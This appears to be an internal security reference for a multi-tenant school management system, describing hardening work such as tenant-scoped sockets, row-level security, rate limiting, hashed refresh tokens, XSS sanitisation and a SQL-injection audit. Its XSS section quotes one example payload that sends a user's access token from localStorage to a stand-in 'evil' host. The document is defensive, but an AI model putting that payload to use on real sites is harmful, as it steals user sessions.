# Security Measures — Reference

This document is the single reference for the security controls in the WiSkul
School Management System. It records what was hardened, where it lives in the
code, and what still needs operator action before/at launch.

> Context: multi-tenant SaaS (React SPA + Express/Knex API on Vercel serverless,
> Neon Postgres, Capacitor Android app). It holds minors' data, guardian PII,
> academic records, and payment info — so tenant isolation and session security
> are the highest priorities.

For deeper per-topic detail see:
- `docs/ROW_LEVEL_SECURITY.md` — RLS rollout + validation
- `docs/CONTENT_SECURITY_POLICY.md` — CSP report-only → enforce

---

## Quick status

| # | Control | Status | Operator action needed |
|---|---------|--------|------------------------|
| 1 | Boot-time env validation | ✅ Enforced in prod | none |
| 2 | Socket.IO handshake auth + tenant rooms | ✅ Done | none |
| 3 | Row-Level Security (RLS) | ⏳ Staged + partial adoption | validate on staging, then expand |
| 4 | Redis-backed rate limiting | ✅ Code done | set `REDIS_URL`, rotate leaked token |
| 5 | Refresh tokens hashed at rest | ✅ Done | migration runs on deploy (re-login once) |
| 6 | XSS lockdown (DOMPurify) | ✅ Done | none |
| 7 | SQL-injection audit | ✅ Done (no live injection) | none |
| + | CSP + security headers | ✅ Report-only | validate in DevTools, promote to enforce |

---

## 1. Boot-time environment validation

**Risk closed:** silent secret fallbacks — the old code used
`process.env.JWT_SECRET || 'your-secret-key-change-in-production'`, so an unset
secret in production would sign forgeable admin tokens.

**Implementation:**
- `backend/src/utils/env.ts` — Zod validation at import time. In **production**
  a missing/short/placeholder `JWT_SECRET` / `REFRESH_TOKEN_SECRET`, or missing
  DB config, **hard-fails the boot** (`process.exit(1)`). Dev/test warn only.
- `backend/src/services/jwtService.ts` and `restoreAccessService.ts` — removed
  the insecure `||` fallbacks; they throw in production if a secret is missing.

**Invariant:** both entry points (`server.ts` local, `api/index.ts` Vercel)
import `index.ts` → `utils/env.js`, so validation always runs first.

Commit: `7ae120e`.

---

## 2. Realtime (Socket.IO) handshake auth + tenant-scoped rooms

**Risk closed:** the old `handleAuth` trusted client-sent `{ userId, role }`
("simplified — in production use proper JWT verification") and joined
`user-{id}` / `role-{role}` rooms with no tenant prefix → cross-tenant leak.
(The server was never actually initialized, so there was no live exposure, but
the code was a landmine.)

**Implementation (`backend/src/services/websocketService.ts`):**
- `io.use()` handshake middleware verifies the JWT and resolves identity from a
  **live DB lookup** (userId/role/tenant/status) — never from client-sent
  fields. Inactive users are rejected.
- All rooms are tenant-namespaced: `tenant:{id}:user:{id}`, `tenant:{id}:role:{role}`.
- `broadcastAlert(tenantId, role, …)` / `broadcastUserNotification(tenantId, …)`
  require a tenant, so a broadcast can't fan out across schools.
- Client (`frontend/src/hooks/useRealtimeDashboard.ts`) sends only the access
  token in the handshake.

Commit: `76b6513`.

---

## 3. Row-Level Security (RLS) — tenant isolation at the DB layer

**Risk addressed:** a forgotten application-layer `WHERE tenant_id = ?` in any
of ~50 route files could leak one school's data to another. RLS enforces the
boundary in Postgres itself.

**Implementation:**
- `backend/src/database/migrations/149_row_level_security.ts` — enables + FORCEs
  RLS on every table with a `tenant_id` column (discovered from the catalog, so
  the list can't drift) with a `tenant_isolation` policy.
- **Backward-compatible policy:** when `app.current_tenant` is unset, access is
  unchanged — so deploying the migration is a no-op until adopted. Isolation
  only engages for queries routed through the wrapper.
- `backend/src/db/tenantContext.ts` — `withTenant(tenantId, fn)` runs work in a
  transaction that sets `app.current_tenant` via `SET LOCAL` (through
  `set_config(..., true)` so it's parameterized and auto-resets per request —
  safe with connection pooling). `withoutTenant(fn)` for platform work.
- `backend/src/middleware/tenantContext.ts` — attaches `req.withTenant(...)`,
  bound lazily to the authenticated user's tenant.
- `backend/src/__tests__/tenantIsolation.test.ts` — cross-tenant test, skipped
  unless `RUN_DB_TESTS=1` + a DB.

**Adoption so far:** the sensitive student sub-resource reads
(`/students/:id/enrollments|grades|attendance`) run through `req.withTenant`.
Commits: `1d1922d` (groundwork), `3e37c13` (first adoption).

**Operator action (see `docs/ROW_LEVEL_SECURITY.md`):**
1. Run migration 149 on **staging**; confirm nothing breaks.
2. Verify the app's Neon role is **not** a superuser/`bypassrls` role.
3. Prove isolation via psql / the guarded test.
4. Expand `req.withTenant` to more hot paths (student profile read, invoices,
   payments, grades/attendance writes).
5. Final: tighten the policy so an unset variable returns **no rows**.

---

## 4. Rate limiting (Redis-backed)

**Risk closed:** login/OTP/passkey endpoints were unprotected against brute
force / credential stuffing; the pre-existing in-memory limiter does not hold
across Vercel serverless instances.

**Implementation (`backend/src/middleware/rateLimit.ts`):**
- `apiLimiter` (broad per-IP), `loginLimiter` (IP+email, 8/15min, skips
  successes), `otpLimiter` (5/hr), `passkeyLimiter` (20/15min).
- Uses a **Redis store when `REDIS_URL` is set**; falls back to in-memory with a
  loud warning otherwise.
- Wired in `index.ts` (global `apiLimiter`, webhook excluded) and
  `routes/authRoutes.ts` (login/reset/passkey).

Commit: `7ae120e`.

**Operator action:**
- Set `REDIS_URL` (Upstash TCP TLS string `rediss://…`, **not** the REST pair)
  in Vercel (backend) + `backend/.env`. Never in any `.env.example`/frontend.
- **Rotate the Upstash token** — it was exposed during setup.
- Confirm the log line `Rate limiting: using Redis-backed store.` after deploy.

---

## 5. Refresh tokens hashed at rest

**Risk closed:** refresh tokens were stored as raw JWTs — a DB dump (injection,
leaked backup, compromised Neon creds) would hand over every live session.

**Implementation:**
- `backend/src/services/authService.ts` — `hashRefreshToken()` (SHA-256; correct
  for high-entropy JWTs). All 3 issue paths store `token_hash`; refresh looks up
  and revokes by hash. Delete-by-`user_id` paths (logout, password reset,
  deactivate/suspend/dismiss) unchanged.
- `backend/src/database/migrations/148_refresh_token_hash.ts` — adds `token_hash`
  + index, relaxes legacy `token` NOT NULL, clears existing rows (pre-launch;
  users re-login once).

Commit: `03630e8`.

---

## 6. XSS lockdown (the practical alternative to httpOnly cookies)

**Risk closed:** three `dangerouslySetInnerHTML` sinks rendered user-entered
rich text as raw HTML — a stored-XSS token-theft vector against localStorage
sessions (e.g. `<img src=x onerror="fetch('//evil/'+localStorage.accessToken)">`).

**Implementation:**
- `frontend/src/lib/sanitizeHtml.ts` — `sanitizeHtml` / `sanitizeMarkup` using
  DOMPurify; strips scripts, event handlers, and `javascript:`/`data:` URIs,
  keeps safe formatting. DOM-bound for browser + tests, strip-tags fallback if
  no DOM.
- Applied at: `AssignmentDetailModal` (description, instructions),
  `TeacherDetailModal` (qualifications).
- `frontend/src/lib/__tests__/sanitizeHtml.test.ts` — proves the attack payloads
  are neutralized (jsdom).

**Why not full httpOnly cookies yet:** the cookie migration is high-risk here
(Capacitor WebView cookie-jar config + on-device testing, offline-first PWA
session logic, cross-origin `SameSite`/CSRF). httpOnly cookies matter *because*
of XSS — closing the XSS vector removes the urgency. Full cookie migration is a
documented future effort.

Commit: `85cdf6d`.

---

## 7. SQL-injection audit

**Result:** audited every `whereRaw`/`orderByRaw`/`havingRaw`/`groupByRaw` and
`db.raw` call. Knex bindings (`?`) were used correctly everywhere, including all
user-input search paths — **no live injection found**.

**Hardened defensively:** three sites interpolated a numeric interval count into
raw SQL (`INTERVAL '${daysOld} days'`, admission trends). Rewritten to bind the
count as a parameter (`NOW() - (? * INTERVAL '1 day')`) so a future caller can't
introduce injection. Files: `notificationService.ts`, `inAppNotificationService.ts`,
`admissionStatisticsService.ts`.

Commit: `1ebbc89`.

---

## CSP + security headers (bonus layer)

**Implementation (`vercel.json`, applies to the SPA served by Vercel):**
- `Content-Security-Policy-Report-Only` (strict: `script-src 'self'`,
  `object-src 'none'`, `frame-ancestors 'none'`, …) — logs violations without
  blocking, so it can be validated before enforcing.
- `X-Content-Type-Options: nosniff`, `Referrer-Policy`, `Permissions-Policy`.

**Operator action (see `docs/CONTENT_SECURITY_POLICY.md`):** click through all
flows in DevTools, widen directives for legitimate violations (likely tighten
`connect-src https:` to the exact API origin), then rename the header to
`Content-Security-Policy` to enforce.

Commit: `7d09fd7`.

---

## Existing controls (already present, verified during review)

- **Passwords:** bcrypt (`bcryptjs`).
- **Passkeys / WebAuthn:** `@simplewebauthn/*` for passwordless + MFA.
- **Access-token TTL:** 30 min; refresh 7 days, revocable, revoked on logout /
  password reset / deactivate / suspend / dismiss / status change.
- **Account + tenant status enforcement:** checked at login, MFA, passkey,
  passwordless, token refresh, and every request (`attachUserContext`).
- **Payment webhooks (Monime):** HMAC signature verified over raw bytes,
  idempotent reconciliation, unmatched events quarantined.
- **Authorization:** role checks via `authorize()` (fixed a prior array-arg bug
  that had broken 4 modules); per-resource tenant/ownership guards across
  students, invoices, id-cards, templates, support tickets, discipline,
  admissions.
- **Transport:** Helmet defaults, CORS allowlist (env + `*.vercel.app`).
- **S3:** presigned URLs with expiry for private files.

---

## Outstanding / future work

1. **Rotate the exposed Upstash token** and confirm Redis store is active.
2. **Validate RLS on staging**, then expand `req.withTenant` adoption; finally
   tighten the policy to hard-deny on unset tenant.
3. **Promote CSP** from report-only to enforce after DevTools validation.
4. **Full httpOnly-cookie session migration** (own effort, with Capacitor device
   testing). XSS fix removes the urgency.
5. **Certificate pinning** for the Capacitor app; store tokens in Android
   Keystore-backed secure storage.
6. **Observability:** ship structured logs off-server; alert on 5xx spikes, auth
   failures, cross-tenant 403s, webhook failures. Add/verify an audit-log table
   for sensitive actions (grade edits, refunds, record views).
7. **Backups:** confirm Neon point-in-time restore is enabled and test a restore.
8. **Dependencies:** `npm audit` shows several highs — triage before launch;
   add Dependabot/Renovate.
9. **Compliance:** privacy policy covering minors' data; Data Processing
   Agreement per school; breach-notification runbook.
